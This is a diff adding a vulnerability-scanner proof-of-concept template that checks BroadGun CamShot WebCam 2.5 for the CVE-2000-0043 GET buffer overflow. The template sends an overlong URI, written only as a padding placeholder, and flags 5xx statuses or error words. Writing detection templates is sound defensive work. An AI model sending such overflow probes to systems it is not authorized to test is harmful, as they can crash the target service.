@@ -1,0 +1,51 @@
+[info]
+author = "ave"
+description = "验证 BroadGun Software CamShot WebCam 2.5 内置 HTTP 服务器是否存在因超长 GET 请求导致的缓冲区溢出。通过向目标 HTTP 服务发送一个包含超长 URI 的 GET 请求，观察服务是否返回异常、连接断开或服务崩溃，从而判定漏洞是否存在。该检测方式为安全无损验证，不会执行任意代码。"
+id = "POC-AVE-2000-0100"
+name = "CVE-2000-0043 CamShot WebCam GET Buffer Overflow PoC"
+severity = "high"
+tags = [
+    "cve-2000-0043",
+    "camshot",
+    "buffer-overflow",
+]
+vuln_id = [
+    "CVE-2000-0043",
+    "AVE-2000-0100",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/AAAAAAA(超长填充)AAAA"
+protocol = "http"
+
+[poc.requests.body]
+content = ""
+type = "raw"
+
+[poc.requests.headers]
+Host = "{{Hostname}}"
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+status = [
+    500,
+    502,
+    503,
+    504,
+]
+type = "status"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "Server Error",
+    "Connection reset",
+    "Bad Request",
+]
